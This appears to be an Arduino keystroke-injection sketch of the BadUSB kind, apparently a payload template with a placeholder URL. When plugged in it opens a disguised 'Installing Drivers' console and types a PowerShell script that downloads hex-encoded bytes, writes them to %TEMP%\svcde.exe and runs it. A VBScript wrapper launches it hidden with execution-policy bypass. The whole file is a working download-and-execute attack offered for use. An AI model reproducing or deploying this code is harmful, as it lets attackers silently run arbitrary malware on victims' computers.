void setup(){
  Keyboard.begin();
}

void loop(){
  
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd(3,500,"cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\""))
  {
  reset_windows_desktop(2000);
  }
  
  Keyboard.println(F("echo $wc = New-Object System.Net.WebClient > %temp%\\dl.ps1"));
  Keyboard.println(F("echo $url = \"INPUT0\" >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo [string]$hex = $wc.DownloadString($url) >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo [Byte[]] $temp = $hex -split ' ' >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo [System.IO.File]::WriteAllBytes(\"%TEMP%\\svcde.exe\", $temp) >> %temp%\\dl.ps1"));
  Keyboard.println(F("echo start-process -nonewwindow \"%TEMP%\\svcde.exe\" >> %temp%\\dl.ps1"));
   
  delay(2000);
  
  Keyboard.println(F("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\dl.vbs"));
  Keyboard.println(F("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\dl.ps1\"),0,true >> %temp%\\dl.vbs"));
  delay(1000);
  Keyboard.println(F("wscript %temp%\\dl.vbs"));
  delay(3000);
  
  Keyboard.println(F("exit"));
  while(true){};
}

DEFS

